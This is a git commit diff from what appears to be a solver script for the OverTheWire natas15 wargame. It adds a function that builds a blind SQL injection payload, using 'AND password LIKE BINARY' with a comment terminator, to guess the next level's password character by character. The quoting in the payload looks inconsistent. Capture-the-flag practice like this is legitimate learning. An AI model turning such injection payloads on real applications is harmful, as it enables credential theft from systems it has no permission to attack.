c3c09900447f5ca9377b63ed23537eb14da90d0e
mohammad <mr.dori.dev@gmail.com>
2021-11-18 13:41:47 +0330

    make query generator function

--- variables.py
+++ variables.py
@@ -11,3 +11,9 @@ auth = (BASIC_USER, BASIC_PASS)
 URL = "http://natas15.natas.labs.overthewire.org/index.php"
 
 CHARS = ascii_letters + digits
+
+NAME = 'natas16'
+
+
+def query_generator(password: str, character: str) -> str:
+    return f'{NAME}{" AND password LIKE BINARY "}{password}{character}%%" -- '
